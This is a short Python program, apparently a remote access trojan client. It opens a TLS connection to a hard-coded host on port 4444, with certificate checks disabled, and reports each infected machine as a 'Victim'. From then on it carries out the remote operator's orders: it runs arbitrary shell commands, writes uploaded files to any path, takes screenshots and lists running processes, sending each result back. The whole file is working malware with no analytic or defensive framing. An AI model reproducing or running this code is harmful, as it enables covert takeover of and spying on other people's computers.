import socket
import json
import subprocess
import os
import base64
import ssl
import time
import platform
import psutil
from pathlib import Path
from mss import mss

HOST = '192.168.1.100'  # admin IP
PORT = 4444
ENCODING = 'utf-8'
BUFFER_SIZE = 4096

def send_msg(sock, msg_type, data):
    """Send JSON message to admin."""
    msg = {'type': msg_type, 'data': data}
    sock.sendall(json.dumps(msg).encode(ENCODING))

def capture_screenshot():
    """Return base64-encoded PNG of the primary monitor."""
    with mss() as sct:
        monitor = sct.monitors[1]
        img = sct.grab(monitor)
        img_bytes = sct.rgb(img)
        return base64.b64encode(img_bytes).decode()

def get_processes():
    """Return a string listing all running processes."""
    proc_list = []
    for p in psutil.process_iter(['pid', 'name', 'username']):
        try:
            proc_list.append(f"{p.info['pid']}\t{p.info['name']}\t{p.info['username']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return "\n".join(proc_list)

def handle_command(sock, cmd):
    """Execute command received from admin and send back result."""
    cmd_type = cmd.get('type')
    payload = cmd.get('data')
    if cmd_type == 'exec':
        try:
            output = subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, text=True)
            send_msg(sock, 'output', output)
        except Exception as e:
            send_msg(sock, 'output', str(e))
    elif cmd_type == 'upload':
        path = payload.get('path')
        data = base64.b64decode(payload.get('data'))
        Path(path).write_bytes(data)
        send_msg(sock, 'output', f"File written to {path}")
    elif cmd_type == 'screenshot':
        img_b64 = capture_screenshot()
        timestamp = int(time.time())
        send_msg(sock, 'screenshot', {'data': img_b64, 'timestamp': timestamp})
    elif cmd_type == 'process':
        proc_info = get_processes()
        send_msg(sock, 'process', proc_info)
    else:
        send_msg(sock, 'output', f"Unknown command type: {cmd_type}")

def main():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    with socket.create_connection((HOST, PORT)) as sock:
        with context.wrap_socket(sock, server_hostname=HOST) as ssock:
            send_msg(ssock, 'status', f"Victim {platform.node()} connected")
            while True:
                try:
                    data = ssock.recv(BUFFER_SIZE)
                    if not data:
                        break
                    msg = json.loads(data.decode(ENCODING))
                    handle_command(ssock, msg)
                except json.JSONDecodeError:
                    continue
                except Exception as e:
                    break
    print("Connection closed")

if __name__ == '__main__':
    main()
